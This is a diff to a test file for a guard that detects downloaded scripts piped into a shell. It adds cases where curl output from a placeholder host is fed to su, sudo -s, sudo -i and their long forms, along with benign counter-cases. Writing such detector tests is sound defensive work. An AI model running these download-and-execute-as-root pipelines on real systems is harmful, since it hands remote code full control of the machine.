@@ -61,6 +61,27 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
         # running each one rather than inferred from the man page:
         #   printf 'echo X\n' | nice sh   ->   X
         pytest.param("RUN curl -sSL https://x.example/i.sh | nice bash\n", id="nice-wrapper"),
+        # `su` is a shell under another name -- it starts the target user's shell with stdin
+        # intact. Not a wrapper: there is no command after it to judge. Confirmed as root so no
+        # password prompt intervenes:
+        #   printf 'echo PWNED\n' | sudo -n su   ->   PWNED
+        pytest.param("RUN curl -sSL https://x.example/i.sh | su\n", id="su-is-a-shell"),
+        pytest.param("RUN curl -sSL https://x.example/i.sh | su -\n", id="su-login-shell"),
+        pytest.param("RUN curl -sSL https://x.example/i.sh | su root\n", id="su-named-user"),
+        # `-s` picks WHICH shell; its operand is not the command being run.
+        pytest.param("RUN curl -sSL https://x.example/i.sh | su -s /bin/sh\n", id="su-shell-flag"),
+        # A FLAG can start a shell with no shell name present at all. The walk steps over `sudo`
+        # and the flag, finds no command, and without this would read as clean:
+        #   printf 'echo PWNED\n' | sudo -n -s   ->   PWNED
+        pytest.param("RUN curl -sSL https://x.example/i.sh | sudo -s\n", id="sudo-dash-s"),
+        pytest.param("RUN curl -sSL https://x.example/i.sh | sudo -i\n", id="sudo-dash-i"),
+        pytest.param("RUN curl -sSL https://x.example/i.sh | sudo -ns\n", id="sudo-clustered-s"),
+        # The long spellings of the same two flags, confirmed to execute the pipe as well:
+        #   printf 'echo PWNED\n' | sudo -n --login   ->   PWNED
+        pytest.param("RUN curl -sSL https://x.example/i.sh | sudo --login\n", id="sudo-long-login"),
+        pytest.param("RUN curl -sSL https://x.example/i.sh | sudo --shell\n", id="sudo-long-shell"),
+        # `su -c` behaves exactly like `sh -c`: a shell operand still reads the stream.
+        pytest.param("RUN curl -sSL https://x.example/i.sh | su -c 'sh'\n", id="su-dash-c-shell"),
         pytest.param("RUN curl -sSL https://x.example/i.sh | setsid sh\n", id="setsid-wrapper"),
         pytest.param("RUN curl -sSL https://x.example/i.sh | ionice -c2 sh\n", id="ionice-wrapper"),
         # These two REQUIRE an operand, so a bare `chrt sh` is a usage error rather than proof
@@ -398,6 +419,16 @@ def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp
         pytest.param("curl -s https://x.example/f ; bash unrelated.sh", id="semicolon-then-shell"),
         # A wrapper in front of something that is not a shell is still not a shell.
         pytest.param("curl -s https://x.example/f | timeout 30 jq .", id="timeout-into-jq"),
+        # `-s`/`-i` start a shell only when NOTHING follows them. With a command present, sudo
+        # runs THAT and the stream is never executed -- so the flag alone cannot be the signal.
+        # Confirmed: printf 'echo X\n' | sudo -n -s echo hi   ->   hi
+        pytest.param("curl -s https://x.example/f | sudo -s echo hi", id="sudo-s-with-a-command"),
+        pytest.param("curl -s https://x.example/f | sudo -s jq .", id="sudo-s-into-jq"),
+        # `-s` on a wrapper that is not a privilege tool means something else entirely (here, the
+        # signal to send). Scoping the flag set to sudo/su/runuser is what keeps this clean.
+        pytest.param(
+            "curl -s https://x.example/f | timeout -s TERM 30 jq .", id="timeout-signal-s"
+        ),
         # `xargs` reads the pipe ITSELF to build an argument list and gives its child /dev/null
         # on stdin, so the download arrives as a FILENAME the shell tries to open, not as a
         # program it runs. Confirmed rather than assumed:
@@ -434,6 +465,20 @@ def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp
         ),
         # The command name merely STARTS with the shell name.
         pytest.param("curl -s https://x.example/f | sudo -u shane cat", id="operand-shell-prefix"),
+        # A command word after `-s` takes over, so the flag no longer starts a shell:
+        #   printf 'X\n' | sudo -n -s jq .   ->   jq parses the stream, nothing is executed
+        pytest.param("curl -s https://x.example/f | sudo -s jq .", id="sudo-dash-s-with-command"),
+        # `-u shane` and `-p prompt` contain the letters the flag scan looks for, in an OPERAND.
+        # Reading them as `-s`/`-i` would flag ordinary pipelines.
+        pytest.param("curl -s https://x.example/f | sudo -u sysadmin cat", id="operand-has-s"),
+        pytest.param(
+            "curl -s https://x.example/f | sudo -p 'pass:' cat", id="prompt-operand-has-s"
+        ),
+        # `su -c 'echo hi'` runs the operand and the stream is data, exactly like `sh -c`.
+        # Confirmed: printf 'X\n' | sudo -n su -c 'echo Y'  ->  Y
+        pytest.param("curl -s https://x.example/f | su -c 'echo hi'", id="su-dash-c-non-shell"),
+        # The command name merely CONTAINS `su`.
+        pytest.param("curl -s https://x.example/f | sudo -u root sudoedit", id="name-contains-su"),
         # The other side of the quoted-URL fix: a query string must not make an ordinary
         # pipeline match either, so the fix cannot be "treat quoted spans as opaque".
         pytest.param("curl -s 'https://x.example/f?a=1&b=2' | jq .", id="quoted-url-into-jq"),
